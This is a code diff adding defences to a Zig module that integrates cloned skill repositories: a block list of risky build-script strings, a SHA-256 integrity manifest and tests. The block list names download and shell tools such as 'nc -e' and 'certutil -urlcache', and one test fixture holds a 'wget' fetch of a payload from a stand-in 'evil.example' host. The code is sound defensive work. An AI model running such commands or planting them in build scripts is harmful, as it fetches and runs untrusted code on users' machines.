@@ -275,6 +275,34 @@ const bad_patterns = [_][]const u8{
     "malware", "exploit", "hack", "crack", "keygen", "ransomware", "trojan",
 };
 
+/// Files hashed into the local integrity manifest for newly integrated skills.
+const integrity_files = [_][]const u8{
+    "skill.json",
+    "build.zig",
+    "root.zig",
+};
+
+/// Local integrity manifest filename stored inside each integrated skill repo.
+const integrity_manifest_name = ".nullclaw-integrity.sha256";
+
+/// Maximum bytes inspected when scanning build scripts for suspicious content.
+const max_build_scan_bytes: usize = 256 * 1024;
+/// Maximum bytes hashed per tracked file when writing integrity manifests.
+const max_integrity_file_bytes: usize = 1024 * 1024;
+
+/// High-risk command patterns that should not appear in auto-integrated build scripts.
+const suspicious_build_patterns = [_][]const u8{
+    "curl ",
+    "wget ",
+    "powershell ",
+    "invoke-webrequest",
+    "bitsadmin ",
+    "certutil -urlcache",
+    "cmd /c",
+    "bash -c",
+    "nc -e",
+};
+
 /// Check if haystack contains word as a whole word (bounded by non-alphanumeric).
 pub fn containsWord(haystack: []const u8, word: []const u8) bool {
     var pos: usize = 0;
@@ -492,6 +520,19 @@ pub fn integrate(allocator: std.mem.Allocator, candidate: SkillCandidate, skills
         };
     }
 
+    validateIntegratedRepoSecurity(allocator, target_path) catch |err| {
+        std.fs.deleteTreeAbsolute(target_path) catch {};
+        return IntegrationResult{
+            .skill_name = safe_name,
+            .install_path = skills_dir,
+            .success = false,
+            .error_message = switch (err) {
+                error.SuspiciousBuildScript => "Cloned repo rejected: suspicious build.zig content",
+                else => "Cloned repo rejected: integrity validation failed",
+            },
+        };
+    };
+
     return IntegrationResult{
         .skill_name = safe_name,
         .install_path = skills_dir,
@@ -505,6 +546,70 @@ fn hasFile(dir_path: []const u8, filename: []const u8) bool {
     const full = std.fmt.bufPrint(&buf, "{s}{s}{s}", .{ dir_path, std.fs.path.sep_str, filename }) catch return false;
     std.fs.accessAbsolute(full, .{}) catch return false;
     return true;
+}
+
+fn validateIntegratedRepoSecurity(allocator: std.mem.Allocator, target_path: []const u8) !void {
+    try rejectSuspiciousBuildScript(allocator, target_path);
+    try writeIntegrityManifest(allocator, target_path);
+}
+
+fn rejectSuspiciousBuildScript(allocator: std.mem.Allocator, target_path: []const u8) !void {
+    if (!hasFile(target_path, "build.zig")) return;
+
+    const build_path = try std.fs.path.join(allocator, &.{ target_path, "build.zig" });
+    defer allocator.free(build_path);
+
+    const build_content = std.fs.cwd().readFileAlloc(allocator, build_path, max_build_scan_bytes) catch
+        return error.SuspiciousBuildScript;
+    defer allocator.free(build_content);
+
+    if (hasSuspiciousBuildPattern(build_content)) {
+        return error.SuspiciousBuildScript;
+    }
+}
+
+fn hasSuspiciousBuildPattern(content: []const u8) bool {
+    for (suspicious_build_patterns) |pattern| {
+        if (std.ascii.indexOfIgnoreCase(content, pattern) != null) {
+            return true;
+        }
+    }
+    return false;
+}
+
+fn writeIntegrityManifest(allocator: std.mem.Allocator, target_path: []const u8) !void {
+    var manifest: std.ArrayList(u8) = .empty;
+    defer manifest.deinit(allocator);
+
+    for (integrity_files) |filename| {
+        if (!hasFile(target_path, filename)) continue;
+
+        const file_path = try std.fs.path.join(allocator, &.{ target_path, filename });
+        defer allocator.free(file_path);
+
+        const content = std.fs.cwd().readFileAlloc(allocator, file_path, max_integrity_file_bytes) catch
+            return error.IntegrityManifestFailed;
+        defer allocator.free(content);
+
+        var digest: [32]u8 = undefined;
+        std.crypto.hash.sha2.Sha256.hash(content, &digest, .{});
+        const hex = std.fmt.bytesToHex(digest, .lower);
+
+        try manifest.appendSlice(allocator, hex[0..]);
+        try manifest.appendSlice(allocator, "  ");
+        try manifest.appendSlice(allocator, filename);
+        try manifest.append(allocator, '\n');
+    }
+
+    if (manifest.items.len == 0) return error.IntegrityManifestFailed;
+
+    const manifest_path = try std.fs.path.join(allocator, &.{ target_path, integrity_manifest_name });
+    defer allocator.free(manifest_path);
+
+    const out = std.fs.createFileAbsolute(manifest_path, .{ .truncate = true }) catch
+        return error.IntegrityManifestFailed;
+    defer out.close();
+    out.writeAll(manifest.items) catch return error.IntegrityManifestFailed;
 }
 
 pub const IntegrationResult = struct {
@@ -1011,4 +1116,49 @@ test "IntegrationResult fields" {
     };
     try std.testing.expect(r.success);
     try std.testing.expect(r.error_message == null);
+}
+
+test "hasSuspiciousBuildPattern detects risky command strings" {
+    try std.testing.expect(hasSuspiciousBuildPattern("const cmd = \"curl https://example.com\";"));
+    try std.testing.expect(hasSuspiciousBuildPattern("run(\"powershell -Command Get-ChildItem\")"));
+    try std.testing.expect(!hasSuspiciousBuildPattern("const x = 42;"));
+}
+
+test "rejectSuspiciousBuildScript rejects risky build.zig" {
+    var tmp = std.testing.tmpDir(.{});
+    defer tmp.cleanup();
+
+    try tmp.dir.writeFile(.{
+        .sub_path = "build.zig",
+        .data = "const std = @import(\"std\");\nconst cmd = \"wget https://evil.example/payload\";\n",
+    });
+
+    const abs = try tmp.dir.realpathAlloc(std.testing.allocator, ".");
+    defer std.testing.allocator.free(abs);
+
+    try std.testing.expectError(error.SuspiciousBuildScript, rejectSuspiciousBuildScript(std.testing.allocator, abs));
+}
+
+test "writeIntegrityManifest writes tracked file checksums" {
+    var tmp = std.testing.tmpDir(.{});
+    defer tmp.cleanup();
+
+    try tmp.dir.writeFile(.{
+        .sub_path = "skill.json",
+        .data = "{\"name\":\"demo\"}\n",
+    });
+    try tmp.dir.writeFile(.{
+        .sub_path = "root.zig",
+        .data = "pub fn main() void {}\n",
+    });
+
+    const abs = try tmp.dir.realpathAlloc(std.testing.allocator, ".");
+    defer std.testing.allocator.free(abs);
+
+    try writeIntegrityManifest(std.testing.allocator, abs);
+
+    const manifest = try tmp.dir.readFileAlloc(std.testing.allocator, integrity_manifest_name, 4096);
+    defer std.testing.allocator.free(manifest);
+    try std.testing.expect(std.mem.indexOf(u8, manifest, "skill.json") != null);
+    try std.testing.expect(std.mem.indexOf(u8, manifest, "root.zig") != null);
 }
